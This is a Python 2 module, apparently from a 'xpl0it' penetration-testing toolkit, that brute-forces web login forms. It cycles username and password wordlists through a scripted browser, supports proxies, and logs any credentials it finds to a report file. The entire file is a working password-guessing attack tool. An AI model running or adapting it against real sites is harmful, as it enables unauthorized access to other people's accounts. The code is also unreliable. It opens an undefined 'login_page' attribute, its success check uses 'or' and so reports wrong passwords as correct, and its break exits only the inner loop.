#!/usr/bin/python
#httpcrack.py

#httpcrack module for xpl0it v0.3
#Coded by wrh1d3 -> wrh1d3[at]gmail[dot]com
#Copyright (c) 2016-2017 J3kill Soft. by wrh1d3

import os, time

from auxilliary.proxy import *
from auxilliary.browser import *
from auxilliary.utils import *

class httpcrack:
	
	def __init__(self, args):
		self.target = check_url(args[0])
		self.username = args[1]
		self.user_form = args[2]
		self.pass_form = args[3]
		self.proxy = args[4]
		self.proxy_type = args[5] 
		self.verbose = args[6]
		self.userslist = os.getcwd() + "/wordslist/users.txt"
		self.wordslist = os.getcwd() + "/wordslist/pass.txt"
		self.results = ""
		
	def crack(self):
		print "\n[+] Target: " + self.target
		if self.verbose == 1:
			print "[!] Checking proxy..."
			
		if self.proxy != "":
			hst, prt = parse_address(self.proxy)
			pr = proxy(hst, prt, self.proxy_type)
			if pr.set_browser_proxy() == True:  
				print "[+] Proxy: " + self.proxy
			else:
				print "[-] Invalid or dead proxy"
		else:
			print "[-] Proxy not set"
			
		print
		
		if self.verbose == 1:
			print "[!] Connecting to target..."
		br = browser()
				
		try:
			br.open(self.login_page)
			
			if self.verbose == 1:
				print "[!] Checking wordslists..."
				
			usernames = open(self.userslist, "r").readlines()
			passwords = open(self.wordslist, "r").readlines()
				
			if self.username != "":
				for word in passwords:
					password = word.replace("\n", "")
					print "[*] Trying: " + password			
					br.select_form(nr = 0)  
					br.form[self.user_form] = self.username
					br.form[self.pass_form] = password
					resp = br.submit()
					if ("login" not in resp.geturl()) or ("attempt" not in resp.geturl()):
						self.results = "Password is " + password
						print "[+] " + self.results
						break
			else:
				for user in usernames:
					username = user.replace("\n", "")
					print "[*] Trying username: " + username
					
					for word in passwords:
						password = word.replace("\n", "")
						print "[*] Trying password: " + password			
						br.select_form(nr = 0)  
						br.form[self.user_form] = username
						br.form[self.pass_form] = password
						resp = br.submit()
						if ("login" not in resp.geturl()) or ("attempt" not in resp.geturl()):
							self.results = "Login is %s:%s" %(username, password)
							print "[+] " + self.results
							break
		except:
			self.results = "Failed to crack password"
			print "[-] " + self.results
					
	def generate_report(self):
		date = time.strftime("%d-%m-%Y")
		filename = "httpcrack_report_%s.txt" %(date)
		
		if not os.path.exists(os.getcwd() + "/reports/" + filename): 
			f = open(os.getcwd() + "/reports/" + filename, "w")
			f.writelines("[!] xpl0it penetration testing toolkit -> httpcrack report\n\n")
			
		f = open(os.getcwd() + "/reports/" + filename, "a")
		f.writelines("Target: " + self.target + "\n")
		f.writelines("Results: \n\n" + self.results + "\n\n")
